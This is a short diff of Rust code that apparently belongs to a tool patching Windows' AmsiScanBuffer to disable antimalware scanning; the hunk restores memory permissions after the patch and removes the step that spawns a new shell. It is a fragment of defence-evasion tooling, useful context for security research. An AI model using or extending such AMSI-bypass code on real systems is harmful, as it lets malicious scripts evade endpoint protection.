@@ -45,8 +45,6 @@ fn main() {
         VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
 
         // Spawn the new powershell.
-        println!("[+] AmsiScanBuffer patched!\n[*] Spawning powershell...");
-        let mut powershell = Command::new("cmd");
-        powershell.spawn();
+        println!("[+] AmsiScanBuffer patched!");
     }
 }
